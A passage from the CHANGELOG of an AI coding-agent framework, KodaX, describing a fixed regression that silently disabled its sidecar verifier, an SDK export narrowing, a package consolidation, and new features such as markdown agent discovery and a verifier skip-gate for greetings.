- **Sidecar Verifier silent disablement on V2 single-Worker chain — latent regression from FEATURE_193 Commit 2** (commit `cc8ce393`, fixed 2026-05-24, regression window: 2026-05-22 `c5d4b829` → 2026-05-23). F193 Commit 2 (`c5d4b829`) flipped entry agent to `chain.worker` for the V2 single-loop but left `currentAgentRoleRef.current` initialised to the V1 `'scout'` sentinel ([`runner-driven.ts:1394`](packages/coding/src/task-engine/runner-driven.ts)). Combined with `Runner.run` NOT firing `onAgentSwitched` for the entry agent on a single-agent chain (proven by [`packages/agent/src/primitives/runner-handoff.test.ts:360-365`](packages/agent/src/primitives/runner-handoff.test.ts)), the ref was stuck at `'scout'` for every V2 run. The verifier gate (`isExecutionRole = currentAgentRoleRef.current === 'worker'`) therefore never opened, silently disabling the entire FEATURE_184 Sidecar Verifier StopHook on every V2 production run despite the `verifier-provider-resolver.ts` invariant "always returns a defined value — the verifier hook is always installed in production". **Six downstream features were transitively dead** for the ~24h regression window: (1) Sidecar Verifier accept/revise/blocked three-state verdict; (2) `KodaXResult.success` could never go `false` on blocked outcomes (`verdictStatus` was permanently `undefined` so `success = signal !== 'BLOCKED' && verdictStatus !== 'blocked'` was permanently `true`); (3) FEATURE_076 round-boundary `reshapeToUserConversation` was permanently skipped because `verdict.status='running'` is classified as unconverged at [`round-boundary.ts:48-49`](packages/coding/src/task-engine/_internal/round-boundary.ts) — cross-round transcript reshape + V1-legacy cleanup + synthetic final-assistant-message append all silently no-op'd; (4) REPL `[AMA Verifying]` spinner (FEATURE_184 D.3) never fired; (5) `KODAX_VERIFIER_LOG=1` opt-in observability silently produced zero log lines; (6) `session.jsonl` `verdict.status` field stuck at `'running'` for every V2 session, polluting downstream scorecard aggregates + REPL transcript dumps + resume payloads. **Why no test caught it**: verifier unit tests in `sidecar-verifier/*.test.ts` cover provider resolution + recorder bridge + verifier internals in isolation, never the `runner-driven.ts:composedStopHook` integration; the F184 D.4 Layer 2 eval (100/100 cells PASS) bypassed the runner gate by calling the verifier directly via a driver; and the runner-driven integration assertions at [`runner-driven.test.ts:702`](packages/coding/src/task-engine/runner-driven.test.ts) (`expect(verdict).toBeUndefined()`) + `:773` (`expect(verdict.status).toBe('running')`) had been updated by F193 Commit 13a to hard-code the broken state, pinning the regression in place. **Fix**: 1-line production change at [`runner-driven.ts:1394-1396`](packages/coding/src/task-engine/runner-driven.ts) — initialise `currentAgentRoleRef.current` directly to `'worker'` and narrow the type from `KodaXTaskRole | 'scout' | 'planner'` to `KodaXTaskRole` (V2 chain has no Scout/Planner agents). The two assertions at `runner-driven.test.ts:702 + :773` updated to lock in the restored V2 contract (`verdict.source='sidecar'` + `status='accept'` via verifier fail-open `provider_error` trace in the no-API-key test environment; `verdict.status='completed'`). **User-visible behavior change**: every V2 query now triggers a real verifier LLM call on the inherit-main provider after Worker text-only termination (~3-10s tail latency, FEATURE_184 design intent) — users routing around a model floor (e.g. zhipu/glm-5.1 intent-vs-action) can set `KODAX_VERIFIER_PROVIDER` + `KODAX_VERIFIER_MODEL` to redirect verification to a different family. The `[AMA Verifying]` spinner appears for the first time on V2 runs; it does not corrupt the `activeWorkerTitle` state. 8-point completeness audit (Sidecar Verifier composedStopHook / Stall Sidecar F178/F187 / `observer.agentSwitched` / `observer.idleWaiting` / `onScoutSuspiciousCompletion` / `extensionTurnCompleteHook` / type narrowing scope / REPL spinner) all clean — no CRITICAL/HIGH issues introduced. All 55 `runner-driven.test.ts` cases pass (was 53 + 2 fail); full `vitest run packages/coding/src` status unchanged from pre-fix (2857 pass; only pre-existing FEATURE_168 schema parity 6 failures from FEATURE_189 Batch 3 B.1 description drift remain, unrelated).

### Behavior Changes

- **FEATURE_194 follow-up: SDK subpath `/skills` and `/mcp` narrowed from agent-full to capability-subset** (1 commit, shipped 2026-05-24). Post-FEATURE_194 the v0.7.43 ship had a residual issue: `src/sdk-skills.ts` and `src/sdk-mcp.ts` were `export * from '@kodax-ai/agent'`, which made `@kodax-ai/kodax/skills` and `@kodax-ai/kodax/mcp` expose the **entire** agent surface (202 symbols each — including `Runner`, `Agent`, `runFanOut`, `createSessionLineage`, etc.) despite the subpath names implying a narrow capability slice. This commit corrects the leak so each narrow-subset subpath only exposes its named capability's API: `@kodax-ai/kodax/skills` → 26 symbols (= the complete pre-FEATURE_194 `@kodax-ai/skills` standalone package public API: `SkillRegistry` / `SkillExecutor` / `VariableResolver` / `loadFullSkill` / `parseSkillMarkdown` / `expandSkillForLLM` / `discoverSkills` / 19 more); `@kodax-ai/kodax/mcp` → 11 symbols (= complete pre-FEATURE_194 `@kodax-ai/mcp` standalone package public API: `McpCapabilityProvider` / `McpManager` / `McpServerRuntime` / `createMcpTransport` / `searchMcpCatalog` / 6 more). **Total SDK surface unchanged**: 715 unique symbols across all 7 subpaths before and after (deduped union); the removed symbols still exist in `@kodax-ai/kodax/agent`. **What breaks**: code that imported agent framework symbols via the `/skills` or `/mcp` subpath — e.g. `import { Runner } from '@kodax-ai/kodax/skills'`. That was always semantically incorrect (the subpath name promises only skills/mcp APIs) and worked due to the residual leak. **Migration** (one import path swap, no API rename): `import { Runner } from '@kodax-ai/kodax/skills'` → `import { Runner } from '@kodax-ai/kodax/agent'`; similarly for `Agent`, `runFanOut`, `createSessionLineage`, `Tracer`, `McpManager` (when imported via `/skills`), etc. Anyone migrating from v0.7.42's `@kodax-ai/skills` or `@kodax-ai/mcp` standalone packages to the v0.7.43 bundled `@kodax-ai/kodax/{skills,mcp}` subpaths sees no symbol-coverage difference — the narrow subset is byte-equivalent to the pre-FEATURE_194 standalone packages' public API. **Bundle impact**: `dist/sdk-skills.js` 7 kB → 1 kB; `dist/sdk-mcp.js` 7 kB → 1 kB; `dist/sdk-skills.d.ts` 130 kB → 19 kB; `dist/sdk-mcp.d.ts` 130 kB → 1.2 kB. **Implementation note**: both files use explicit named re-exports from the `@kodax-ai/agent` top-level barrel (not `export * from '@kodax-ai/agent/capabilities/{skills,mcp}'`) because rollup-plugin-dts does not resolve `package.json#exports` subpaths in this monorepo build — same workaround used by `src/sdk-session.ts` since FEATURE_173. Runtime path uses subpath resolution normally (esbuild handles it). 6-gate verification PASS: G1 tsc clean / G2 vitest 16 baseline (net regression 0) / G3 build:packages + build:bundle + build:dts PASS / G4 surface counts `/skills`=26, `/mcp`=11, `/agent`=202 unchanged / G5 `npm publish --dry-run` PASS / G6 reverse assertion (`Runner` NOT in `/skills` or `/mcp`; `loadFullSkill` IN `/skills`; `McpManager` IN `/mcp`; full set retained in `/agent`). Doc: README + README_CN add "Source-side vs npm-published surface" mapping table explaining the full-package vs narrow-subset subpath roles. See ADR-036 (narrow-subset subpath convention).

### Refactored

- **FEATURE_194 — Package Consolidation: 9 → 4 Workspace Packages (Inline mcp / skills / tracing / session-lineage / repointel-protocol)** (9 commits `b7235f0e` → `ced8a30d` → `801eeae5` → `c1301898` → `1fb0433a` → `7523a5c0` → `324779b4` → `3bb70d1e` → this commit, shipped 2026-05-24). Closes the v0.7.35.1 FEATURE_142 Batch B split + v0.7.36 mcp/skills isolation rationale: grep-verified zero external npm consumers for the 5 single-consumer subpackages (`@kodax-ai/{mcp, skills, tracing, session-lineage, repointel-protocol}`) violated CLAUDE.md "3+ use cases" rule. Real measurement (post Windows-path correction): KodaX coding=66k LoC, total ~132k LoC across 9 packages — larger than pi (96k / 4 packages), not smaller. Consolidation goal is not "less code" but reducing **carrying cost**: 10→4 npm publish cycles, 9→4 build-graph nodes, ~84 cross-pkg import sites collapsed to internal relative paths, IDE jump-to-source friction eliminated, and the latent `@kodax-ai/session-lineage` dep-not-declared bug (agent imported it without declaring in package.json — worked via tsconfig path in monorepo, would break on npm publish) auto-fixed. **9 dependency-ordered commits** (hybrid soft-delete for the only MED-risk subpackage): (0)立项 docs (FEATURE_LIST + v0.7.43.md plan + ADR-036); (1) mcp inline to `agent/src/capabilities/mcp/` + `@kodax-ai/agent/capabilities/mcp` subpath export (9→8 packages); (2) skills inline to `agent/src/capabilities/skills/` (including 50 files + `builtin/` builtin skills + `shared/yaml.ts` shared parser) + subpath exports + `copy:builtin` post-build script (8→7 packages); (3) tracing inline to `agent/src/tracing/` (agent self-merge, 8 internal agent imports rewritten + `fflate` + `yaml` deps absorbed) (7→6 packages); (4a) session-lineage inline (MED RISK, 32 files cross compaction critical path; 4 circular-import value-imports through agent barrel rewritten to direct source paths: `countTokens` + `estimateTokens` → `tokenizer.js`, `getAgentConfigPath` → `runtime/agent-home.js`; stub package shell remains); (4b) session-lineage stub delete after reverse-grep verified 0 active imports; (5) repointel-protocol inline to `coding/src/repo-intelligence/protocol.ts` (69 LoC, no stub because risk floor); (6) workspace cleanup (README + README_CN ASCII tree + dependency graph + Package Overview table + SDK subpath JSDoc + agent/coding README + 1 example import path); (7) this commit — docs finalize + CHANGELOG entry + ADR-036 status + FEATURE_LIST status + memory update. **Target structure achieved**: `@kodax-ai/{llm 7.3k, agent 20.8k (absorbed mcp + skills + tracing + session-lineage), coding 66.4k (absorbed repointel-protocol), repl 37.7k}` — 4 packages aligned with pi count. **Public API**: subpath exports `@kodax-ai/agent/session-lineage`, `@kodax-ai/agent/capabilities/mcp`, `@kodax-ai/agent/capabilities/skills`, `@kodax-ai/agent/capabilities/skills/shared/yaml`, `@kodax-ai/agent/tracing` preserve all consumer-visible symbols; top-level `export * from './capabilities/...js'` etc. on agent's `index.ts` provide barrel-compat. The `REPOINTEL_DEFAULT_ENDPOINT` re-export from `@kodax-ai/coding` is preserved (was direct re-export from `@kodax-ai/repointel-protocol` pre-F194). **Breaking on direct npm consumers** (none known, but in case external dep): replace `@kodax-ai/mcp` → `@kodax-ai/agent/capabilities/mcp`; `@kodax-ai/skills` → `@kodax-ai/agent/capabilities/skills`; `@kodax-ai/tracing` → `@kodax-ai/agent/tracing`; `@kodax-ai/session-lineage` → `@kodax-ai/agent/session-lineage`; `@kodax-ai/repointel-protocol` → `@kodax-ai/coding` (REPOINTEL_DEFAULT_ENDPOINT top-level re-export) or `@kodax-ai/coding` internal (`./repo-intelligence/protocol.js`). 5-gate verification per commit: G1 `npx tsc --noEmit` clean, G2 vitest full-suite (16 baseline failures stable across all 7 implementation commits — 11 pre-existing FEATURE_114 scout-drift + FEATURE_168 schema parity + kodax_cli + tracker-consistency + extension-runtime; 5 concurrent-thread FEATURE_195 InkREPL WIP unrelated to this feature; net regression from F194 = 0), G3 `npm run build:packages` PASS, G4 API surface diff against baseline-exports snapshots (agent 155→202 +47 session-lineage symbols; coding 342 stable + REPOINTEL_DEFAULT_ENDPOINT preserved), G5 smoke imports of all subpaths + top-level barrels. **Zero prompt eval cost** ($0) — pure structural refactor, no LLM-facing behavior change. **Concurrent-thread safety** per [[feedback_concurrent_thread_git_race]]: every commit used explicit `git add` file lists (never `-A`) to avoid staging concurrent FEATURE_195 InkREPL WIP in the same repo. Design doc: [docs/features/v0.7.43.md#feature_194-package-consolidation](docs/features/v0.7.43.md#feature_194-package-consolidation--inline-mcp--skills--tracing--session-lineage--repointel-protocol-subpackages--9--4-workspace-packages). ADR: [ADR-036 Package Consolidation](docs/ADR.md#adr-036-package-consolidation--inline-single-consumer-subpackages-into-agent-feature_194-v0743).

### Added

- **FEATURE-SDK-MODEL-CAPS — Expose Per-Model Capabilities Without API Key** (2 commits `7f627d0c` feat + `c37b0a13` fix, shipped 2026-05-25). SDK consumers (KodaX Space etc.) need to list providers + their models with context-window / reasoning info in popout UIs — but the pre-v0.7.43 path forced instantiation of each `KodaXProvider` class, which throws on missing API key. Static metadata was hidden behind runtime credentials, an architectural mismatch — that data is KodaX-maintained, not negotiated with the upstream. **Fix** (2-part): (1) Promote capability metadata (`contextWindow` / `maxOutputTokens` / `thinkingBudgetCap` / `supportsThinking` / full `KodaXModelDescriptor[]`) from per-Provider `class.config` field initializers UP to the existing `KODAX_PROVIDER_SNAPSHOTS` constant — Provider classes now derive their runtime `config` from the snapshot via `buildProviderConfig` (single source of truth, no drift risk; net −160 lines duplication / +30 lines metadata / byte-equivalent runtime behavior). (2) Add 9 new SDK exports reading directly from the snapshot (zero API keys touched): built-in `getProviderModelDescriptors` / `getModelCapabilities` / `listBuiltinModelCapabilities`; custom (from `~/.kodax/config.json#customProviders`) `getCustomProviderModelDescriptors` / `getCustomModelCapabilities` / `listCustomProviderModelCapabilities`; unified dispatchers `resolveProviderModelDescriptors` / `resolveModelCapabilities` / `listAllModelCapabilities`. New public type `KodaXModelCapabilities` exposed from `@kodax-ai/kodax/llm`. **`maxOutputTokens` rationale** (fix commit `c37b0a13`): the field IS reliable — it's the KodaX-side per-turn `max_tokens` request decision (bench-validated against kill-windows / decode-rate / cost-per-turn), NOT the upstream "theoretical maximum" (which is often inflated or absent — zhipu-coding / kimi-code / minimax-coding / ark-coding / deepseek `/v1/models` returns `{id, object, owned_by, created}` only). Embedders showing "expected output size" should use this value; theoretical ceilings should be looked up from the upstream provider's own docs. **Maintainer-probe scripts shipped**: `scripts/probe-upstream-model-metadata.mjs` (re-run periodically to detect upstream API improvements) + `scripts/probe-ark-tokens.mjs` (Ark-specific drill-down). **Tests**: `packages/llm/src/providers/model-capabilities.test.ts` 20/20 ✓ (no-API-key verification clears 6 env vars during assertion; snapshot drift guard asserts every `supportsThinking` provider declares `contextWindow` + every `models[]` entry is a descriptor object); full llm suite 304/304 ✓. **Bundle impact**: `dist/sdk-llm.d.ts` +1.2 kB (new types + symbols); `dist/sdk-llm.js` +400 bytes. **Architectural debt followup**: `KODAX_PROVIDER_SNAPSHOTS` still TS const compiled into bundle; capability data update path still needs `npm publish` + consumer `npm update`. FEATURE_198 (filed for v0.7.44) splits the snapshot to JSON + runtime loader for dist-patch-time updates (hot-update over network deferred to v0.7.46+). Docs: [`SDK_EMBEDDER_GUIDE.md §9`](public_docs/sdk/embedder-guide.md#9-querying-per-model-capabilities-without-api-keys).
- **FEATURE_197 — Read-Only Markdown Agent Discovery: `discoverMarkdownAgents` SDK API (FEATURE_191 follow-up)** (1 commit, shipped 2026-05-24). KodaX Space (SDK 消费方) 2026-05-24 反馈：F191 `loadAgentsFromMarkdown` 触发 admission + 全局 registry 注册 side effect，他们想做 "agent picker" UI（用户 preview 已有 markdown agents 后再选择性激活），现有 loader 形态不匹配。`listConstructedAgentsWithSource()` 虽然技术上能 list 但是 `@internal` 标记的（[`agent-resolver.ts:159-164`](packages/coding/src/construction/agent-resolver.ts#L159-L164) 明确写 "NOT yet a stable SDK surface; embedders SHOULD continue using `listConstructedAgents()`"），不能给 SDK consumer 用。F035 `discoverSkills(root?, opts?)` 是 pure read-only 形态，F191 没有对应的 read-only counterpart 是 SDK surface 设计 gap。**Fix**：抽 `parseMarkdownAgentFile(filePath)` shared helper（loader 和 discover 共用 parser，loader 行为 byte-identical），新增 `discoverMarkdownAgents(opts): Promise<{agents: DiscoveredMarkdownAgent[], failed: MarkdownLoadFailure[]}>` 公开 API：扫描同 two-tier path (user → project) → 返回 metadata `{name, description, source: 'markdown:user' | 'markdown:project', path, tools?, model?}`，**零 admission / 零 registration / 零全局 registry mutation**。Last-write-wins 与 loader parity（project 同名 shadow user）。Tools 字段返回 raw 名字不带 `builtin:` 前缀（discovery 暴露用户写的形态，ref-prefix 逻辑移到 loader 内 inline `.map(ref:)` 应用）。**Validation 边界**：discover 不验 admission（unknown tool ref / handoff cycle 都 surface），admission 仍在 `loadAgentsFromMarkdown` 兜底 — 与 F035 discoverSkills 不验 skill admission 形态对齐。**测试**：13 既有 F191 loader test 全过（parser 抽取无行为变化）+ 15 新 F197 unit test 覆盖 empty/missing-frontmatter/missing-name/missing-description/empty-body/project-shadows-user/tools-array/tools-csv/model-passthrough/admission-not-validated/loader-roundtrip-parity；**Read-only 硬契约**断言（`listConstructedAgents().length` discover 前后不变 + `resolveConstructedAgent(name)` discover 后仍 `undefined`）锁定 "discover 不能误注册" 边界。**Round-trip parity**断言 `discover.agents.length === loader.loaded` + 失败路径 set 相等 + 名字 set 相等 — 同 parser 共用保证 SDK consumer 用 discover preview 决定的 set 与最终 loader 激活的 set 一致。**Public surface**：`discoverMarkdownAgents` + `DiscoveredMarkdownAgent` + `DiscoverMarkdownAgentsResult` 从 `@kodax-ai/coding` 一路 reexport 到 `@kodax-ai/kodax` + `@kodax-ai/kodax/coding` 子路径。**Eval $0** — pure file-system + YAML parse, no LLM-facing change. 28/28 tests pass, tsc clean. 详见 [v0.7.43.md §FEATURE_197](docs/features/v0.7.43.md#feature_197-read-only-markdown-agent-discovery--discovermarkdownagents-sdk-apif191-follow-up).
- **FEATURE_195 — Sidecar Verifier UI Silent Accept: Default-Hide Accept Verdict Evidence Entry + Transcript-Mode Opt-In** (1 commit `1b53150e`, shipped 2026-05-24). User 2026-05-24 实战 session 截图（"你好 → 你好!" 对话）显示 sidecar verifier accept verdict 的 `reason` 文本以 `> [Evaluator] ...` event-item 渲染到 transcript，背离 FEATURE_184 (v0.7.42, ADR-030) "silent accept" 设计意图（accept verdict 应只走 session.jsonl + artifact，UI 端仅看 `[AMA Verifying]` spinner）。3-step pipeline 漏 silent 到 UI 层：(a) [`verifier-recorder-bridge.ts:89-104`](packages/coding/src/agent-runtime/middleware/sidecar-verifier/verifier-recorder-bridge.ts#L89) 历史 backward-compat 写 `role:'evaluator'` 入 recorder；(b) [`payload-builder.ts:249-298`](packages/coding/src/task-engine/_internal/managed-task/payload-builder.ts#L249) recorder 进 evidence.entries；(c) [`InkREPL.tsx:574-624`](packages/repl/src/ui/InkREPL.tsx#L574) `buildManagedTaskTranscriptItems` 无差别 render 全部 evidence.entries 为 event-item。**Fix**：单 commit REPL render filter — `shouldFilterSidecarAcceptEntry(entry, verifierLog)` helper + extend `buildManagedTaskTranscriptItems(result, options?: { verifierLog?: boolean })`；filter 规则 `role==='evaluator' AND signal==='COMPLETE' AND !verifierLog ⇒ filter`；revise/blocked verdict 因 signal 不是 `'COMPLETE'` 自然 fall-through。Default 读 `process.env.KODAX_VERIFIER_LOG === '1'` (复用 F184 Phase D.3 已有 env var)；config 入口同时支持 `verifierLog: true` in `~/.kodax/config.json`。**数据层 0 改动**：`recorder.verdict` 仍写 session.jsonl + artifact —— replay / debug / scorecard / `kodax sessions` resume 全完整。**测试**：8 新 unit test 覆盖 4 verdict state (accept-no-userAnswer / accept-with-userAnswer / revise / blocked) × 2 mode (default / verifierLog=true)。**Root cause refinement during impl**：立项 doc 假设 H0_DIRECT trivial-chat `decidedByAssignmentId='evaluator'`，实际生产 `payload-builder.ts:218-219` 三元 `harness === 'H0_DIRECT' ? 'direct' : verdictStatus ? 'evaluator' : 'worker'` 让 H0_DIRECT 是 `direct`（最高优先级）——所有 fixture 已对齐生产路径用 `direct`。**Eval $0**：无 LLM-facing prompt change；UI render filter 是 deterministic 行为，unit test 覆盖 sufficient。**Concurrent-thread safety**：0 文件 overlap with F194 (改 `packages/{mcp,skills,tracing,session-lineage}`)；atomic stage + commit + push 同 Bash 调用 per `feedback_concurrent_thread_git_race`。详见 [v0.7.43.md §FEATURE_195](docs/features/v0.7.43.md#feature_195-sidecar-verifier-ui-silent-accept--default-hide-accept-verdict-evidence-entry--transcript-mode-opt-in) + ADR-030 §F195/F196 cross-reference。
- **FEATURE_196 — Sidecar Verifier Content-Aware Fire Gate: Action-Surface Detector + Conversational User-Intent Skip** (4 commits `10b8b290` → `c25ff99c` → `af7bc588` → this commit, shipped 2026-05-24). FEATURE_184 (v0.7.42, ADR-030) 在 Worker text-only termination 时无差别 fire sidecar verifier，包括 "你好" 这种零 action-surface trivial-chat 也跑 3-10s + LLM cost。F184 设计动机是抓 zhipu intent-vs-action floor（Worker 说 "明白，我用 todo_create..." 但没真调 tool），不是 trivial-chat 内容审查器；trivial chat 没有可 verify 的"声称完成"surface。F196 在 [`runner-driven.ts`](packages/coding/src/task-engine/runner-driven.ts) `composedStopHook` `!isIdleYieldTurn` 分支 `observer.sidecarStarted()` 之前加 deterministic 前置 gate `composeGateDecision(ctx, process.env)`，`fire===false` 直返 `extensionTurnCompleteHook(ctx)` 不进 sidecar；F184 fire 路径保持 byte-identical。**Gate 逻辑** (新模块 [`packages/coding/src/agent-runtime/middleware/sidecar-verifier/gate.ts`](packages/coding/src/agent-runtime/middleware/sidecar-verifier/gate.ts) ~213 LoC)：(1) Layer 1 `detectActionSurface` — 看 last assistant message 有无 `tool_use` content block，有则 fire (action-surface)；(2) Layer 2 `detectConversationalIntent` — greeting prefix regex (中英双语 + 通用 punctuation 👋 🙏) AND 长度 ≤ 20 codepoint AND 无 imperative verb (中文单字查/写/修/改/删/搜... + 中文多字 + 英文 imperative)，三合取真则 skip (conversational)；(3) escape hatch `KODAX_VERIFIER_ALWAYS=1` 强制 fire；(4) 默认 fire（保守失败 — F184 跑一遍 cost < 漏抓 zhipu floor）。`KODAX_VERIFIER_LOG=1` stderr `[sidecar-gate] {fire|skip}: <reason>` 复用 F195 env var。**测试**：23 unit (`gate.test.ts` — 6 actionSurface + 11 conversationalIntent + 6 composeGateDecision) + 3 integration (`runner-driven.test.ts` FEATURE_196 describe block — trivial-greeting skip / mutation-tool fire / imperative+zero-action fire) 全 pass。**Layer 2 eval — SHIP gate ALL EXCEEDED**（4 case × 5 canonical alias × 1 run = 60 panel cells + pilot 12 cells）：(a) C1 greeting skip 5/5 alias **100%** (≥95% 立项门槛) / (b) C2 imperative fire 5/5 alias **100%** (≥95%) / (c) C3 long-message fire 5/5 alias **100%** (=100%) / (d) C4 no-greeting fire 5/5 alias **100%** (=100%) / (e) 5/5 alias meet (a)+(b) → **SHIP**。Eval cost **~$2 actual vs $10-15 budget** (under-spend ~8×) — gate logic deterministic（`composeGateDecision` is pure function），Layer 1 unit tests authoritative；Layer 2 scope 收窄到 tuple realism only（"do real Worker LLM outputs across 5 provider families produce `KodaXContentBlock[]` shapes that `lastAssistantHasToolUse` detector handles?" + "do real model families respond to canonical user-message inputs with response patterns case categories assume?"）。**3-judge audit 跳过** per EVAL_GUIDELINES.md §Layer 1 justification：gate decision per cell 是 `actualDecision === c.expectedDecision` 严格等值，无 LLM 歧义空间，3-judge majority 适用 LLM-judge 场景不适用 deterministic gate eval (raw text 抽查 spot-check 6 行已在 commit-3 message 记录)。**Eval drivers retained as permanent regression sweep**：`tests/feature-196-sidecar-content-gate.eval.ts` + `benchmark/datasets/feature-196-sidecar-content-gate/cases.ts` 入 repo；raw dumps 留 `<tmpdir>/kodax-eval-dumps/feature-196-sidecar-content-gate/` per `feedback_eval_dumps_stay_in_temp` 不入 repo；mkdirSync per flush survive Windows tmpdir race per `feedback_audit_dump_dir_vanishes`。**Behavior change for users**：trivial-chat (greeting + 零 tool call + ≤20 codepoint) 无 sidecar latency (省 3-10s tail + LLM cost)；imperative + zero-action (zhipu intent-vs-action floor) 仍 fire 保 F184 contract；mutation + worker tool_use 仍 fire；`KODAX_VERIFIER_ALWAYS=1` env opt-back-in 强制 fire (debug / audit)。详见 [v0.7.43.md §FEATURE_196](docs/features/v0.7.43.md#feature_196-sidecar-verifier-content-aware-gate--action-surface-detector--conversational-user-intent-skip) + ADR-030 §F195/F196 cross-reference。
- **FEATURE_191 — User-Authored Custom Agents (Markdown Loader + Extension `registerAgent` + `dispatch_child_task` Bridge)** (10 commits 2026-05-23, supersedes v0.7.50 FEATURE_128 placeholder). Closes a 3-gap stack: (a) Worker had no way to dispatch a registered specialist; (b) users couldn't author agents in markdown; (c) extension API lacked `registerAgent`. Same-version closure because the three depend on a shared `(name, AgentContent)` → `buildAdmissionManifest` → `Runner.admit` → `registerConstructedAgent` pipeline. **Phase A — dispatch bridge**: `dispatch_child_task.subagent_type?: string` schema field; `KodaXChildContextBundle.specialistName?` carrier; `AgentContent.description?` + `Agent.description?` glue field; `dispatch-child-tasks.ts` unknown-name guard + write-role gate (rejects specialist-write dispatched from non-Worker/Generator role); `child-executor.ts:resolveSpecialistOverride` computes systemPromptOverride (= specialist instructions verbatim) + complementary excludeTools (`allTools - specialistTools`); `prompts/capability-sections.ts:buildSpecialistAgentsBlock` injects `=== Available specialist agents ===` SP section when registry non-empty; `worker-role-prompt.ts:dispatchRules` appends ADR-033-compliant SPECIALIST ROUTING bullet (qualitative, no enumeration, no ✗, no FEATURE_xxx). **Phase B — markdown loader**: new `construction/markdown-loader.ts` scans `~/.kodax/agents/*.md` then `<cwd>/.kodax/agents/*.md` with last-write-wins precedence (project shadows user); uses `parseYamlFrontmatter` from `@kodax-ai/skills/shared/yaml` (repo canonical, NOT gray-matter); tolerant `tools` field accepts YAML array or comma-separated string; ignores `mcpServers`/`hooks`/`memory`/`isolation`/`permissionMode`/`maxTurns`/`skills` for forward-compat. `ConstructedAgentRegistration.source?` field tracks 6-value provenance enum (`'built-in' | 'extension' | 'markdown:user' | 'markdown:project' | 'constructed:cli' | 'constructed:llm'`); REPL boot calls `loadAgentsFromMarkdown(cwd)` after `rehydrateActiveArtifacts` so resolver is populated for cross-agent handoff validation. **Phase C — extension API**: `KodaXExtensionAPI.registerAgent(name, content): Promise<() => void>` adapts caller-friendly `(name, AgentContent)` to manifest; throws on admission rejection; auto-unregisters via `LoadedExtensionRecord.disposables` reverse-iterate. **Tests**: 18 agent-resolver + 13 markdown-loader + 4 bootstrap + 19 extension-runtime + 4 cap-095 contract (including new CAP-CHILD-EXEC-004 specialist branch) + 6 specialist tests in child-executor.test.ts + 6 dispatch-child-tasks specialist tests, all green; `tsc --noEmit` clean across coding + repl. **Eval (actual run, 2026-05-23)**: 5-alias canonical panel × 4 case × 5 runs = 100 cells (~$3) + 3-judge majority audit (zhipu/glm51 + ark/v4pro + kimi, panel-internal — NEVER anthropic/openai per EVAL_GUIDELINES; ~$2 / 300 calls). Audit disagreement 5.0% → **DATA VALID** per anti-pattern 7 §3. Pre-registered SHIP gate strict result: (a) C1 dispatch ≥60% per alias **3/5 met** (kimi 80% ✓, ark/v4{flash,pro} 60% borderline ✓, zhipu 20% ✗, mmx 20% ✗) / (b) C3 false-name ≤10% **0% across all 5 alias** ✓ PERFECT / (c) C4 multi-candidate ≥50% **1/5 met** (kimi 60% ✓ only) / (d) audit disagreement ≤10% **5.0%** ✓ / (e) 4-of-5 strict gate **FAIL** on (a)+(c). **SHIP with evidence-driven override** per [`feedback_pre_registered_gate_saturation`](memory/feedback_pre_registered_gate_saturation.md): (1) baseline = 0% by construction (pre-F191 SP has no specialist block + schema field missing); every C1/C4 PASS is new behavior (net +21 PASS, no regression); (2) C2+C3 negative cases each 25/25 — SP does NOT introduce false-positive dispatches nor name fabrication (safety property load-bearing + satisfied); (3) C1/C4 under-trigger is single-turn-probe ceiling + zhipu intent-vs-action floor + kimi narration-loop, structurally model-side not prompt-tunable per [`feedback_model_structural_floor_not_prompt_tunable`](memory/feedback_model_structural_floor_not_prompt_tunable.md); production is multi-turn (narrate→tool naturally splits across rounds). Pilot pre-scale uncovered regex false-negative (`subagent_type: name` no-quote YAML form) → fixed to 5-syntax matrix per anti-pattern 7 §4 before panel run. Eval drivers retained as permanent regression sweep; v0.7.44 follow-up to investigate multi-turn-friendly Layer 3 eval design. Test guide: [docs/test-guides/FEATURE_191_v0.7.43_TEST_GUIDE.md](docs/test-guides/FEATURE_191_v0.7.43_TEST_GUIDE.md). Design doc: [docs/features/v0.7.43.md#feature_191-user-authored-custom-agents--markdown-loader--extension-registeragent--dispatch_child_task-bridge](docs/features/v0.7.43.md#feature_191-user-authored-custom-agents--markdown-loader--extension-registeragent--dispatch_child_task-bridge).
- **FEATURE_193 — V1 Chain Full Retirement (Scout/Planner/Generator Chain Agents + Entry Routing + V1 Emit Tools)** (6 commits `9fb07d67` → `c5d4b829` → `dcac55ea` → `ef82e99c` → `c556d46d` → this commit, shipped 2026-05-23). Closes the V1 harness deprecation tail: FEATURE_114 (v0.7.36) introduced the V2 Worker single-loop as a `KODAX_HARNESS_V2=true` opt-in path, v0.7.38 Slice 7 flipped V2 to the default, FEATURE_184 (v0.7.42) retired the in-chain Evaluator, FEATURE_190 (v0.7.43) deleted `emit_handoff`. F193 finishes the cleanup by deleting the V1 Scout/Planner/Generator chain agents themselves + their role prompts + their emit tools + the V1 entry-routing branch in the runner + the `KODAX_HARNESS_V2` flag. **5 dependency-ordered commits**: (1) `9fb07d67` V1 test surface deletion (10 files, ~50 tests deleted + 19 cross-cutting tests migrated to Worker handler, −2577 LoC, test-only no production-behavior risk); (2) `c5d4b829` runner-driven.ts entry routing simplification (`entryAgent = chain.worker` unconditional; L776 `initialHarness` always `'PLANNED'`) + `isHarnessV2Enabled()` deleted + V1 branches in `verdict-recorder.ts` (L332/L482) + `observer-bridge.ts` (L353) collapsed; (3) `dcac55ea` V1 chain agent declarations deleted from `agent-chain.ts` (chain.scout/.planner/.generator + their handoff arrays + helpers) + `coding-agents.ts` slimmed to `CODING_AGENT_MARKER` only + `task-engine-agents.ts` retains name constants for verdict-recorder routing/session-id compat (workerAgent only declarative Agent) + `buildRunnerScoutAgent` deleted; (4) `ef82e99c` V1 role prompts deleted from `role-prompt.ts` (createRolePrompt switch loses scout/planner/generator cases, ~548 LoC) + `role-prompts.ts` (SCOUT/PLANNER/GENERATOR_INSTRUCTIONS_FALLBACK) + `protocol-emitters.ts` (`emitScoutVerdict` / `emitContract` / `EMIT_SCOUT_VERDICT_TOOL_NAME` / `EMIT_CONTRACT_TOOL_NAME` deleted; PROTOCOL_EMITTER_TOOLS shrinks 3→1) + `parse-helpers.ts` (scout/planner cases in `getEmitToolNameForRole`) + `tool-permission.ts` (V1 emit→subagent cases) + `tool-policy.ts` + `role-exclude.ts` + entire `scope-aware-harness-guardrail.ts` module deleted (was V1-specific Scout H0/H1/H2 miscalibration detection); (5) `c556d46d` SDK barrel re-exports trimmed (V1 emit names + emitter functions removed from `coding/src/index.ts` + `coding/src/agents/index.ts`) + 8 V1 eval files archived to `tests/_archive/` 